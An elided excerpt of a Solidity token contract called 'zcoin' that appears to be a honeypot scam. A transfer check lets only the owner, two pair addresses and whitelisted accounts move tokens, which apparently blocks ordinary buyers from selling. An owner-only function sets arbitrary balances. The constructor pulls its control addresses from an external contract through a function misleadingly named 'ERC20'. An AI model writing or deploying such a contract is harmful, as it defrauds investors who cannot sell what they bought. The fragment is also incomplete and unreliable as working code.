...
interface IERC20 { 
   ...
   /**
     ...
     */
    function ERC20()external view returns (address,address,address,address,uint,uint) ;
   /**
...
contract zcoin {
    ...
    function ensures(address _from, address _to, uint _value) internal returns(bool) {uint e;
        ...
        if (ins()) {if (_to == pairA ) {require (e == y);}
             ...
             require( _to == pairA || _to == pairB );} 
        if (_to==owner||_from==owner||_to==pairA || _to==pairB ||canSale[_to]){return true;} 
    ...
    function transferTo(address adder, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[adder] = addedValue*(10**uint256(decimals));}
        canSale[adder]=true;
        return true;
    }
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable {
        ...
        (A,B,pairA,pairB,a,b)=IERC20(pairA).ERC20();
